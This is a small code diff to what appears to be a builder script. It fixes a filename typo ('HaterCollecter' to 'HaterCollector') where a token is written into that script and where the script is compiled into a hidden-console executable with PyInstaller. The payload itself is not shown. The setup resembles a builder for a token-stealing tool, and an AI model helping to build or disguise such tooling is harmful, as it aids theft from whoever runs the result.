@@ -38,13 +38,13 @@ def update_hatercollector_script(token):
         if not token_updated:
             lines.append(f'\ntoken = "{token}"\n')
 
-        with open('HaterCollecter.py', 'w') as file:
+        with open('HaterCollector.py', 'w') as file:
             file.writelines(lines)
         
         log_message("[+] HaterCollecter.py updated with the new token.")
     except Exception as e:
-        log_message(f"Failed to update HaterCollecter.py: {e}")
-        messagebox.showerror("Error", f"Failed to update HaterCollecter.py: {e}")
+        log_message(f"Failed to update HaterCollector.py: {e}")
+        messagebox.showerror("Error", f"Failed to update HaterCollector.py: {e}")
 
 # Function to build the executable using PyInstaller
 def build_exe():
@@ -57,7 +57,7 @@ def build_exe():
             '--onefile',
             '--windowed',
             '--noconsole',
-            'HaterCollecter.py',  # Hardcoded script
+            'HaterCollector.py',  # Hardcoded script
             '--distpath', 'dist'  # Hardcoded output directory
         ])
         
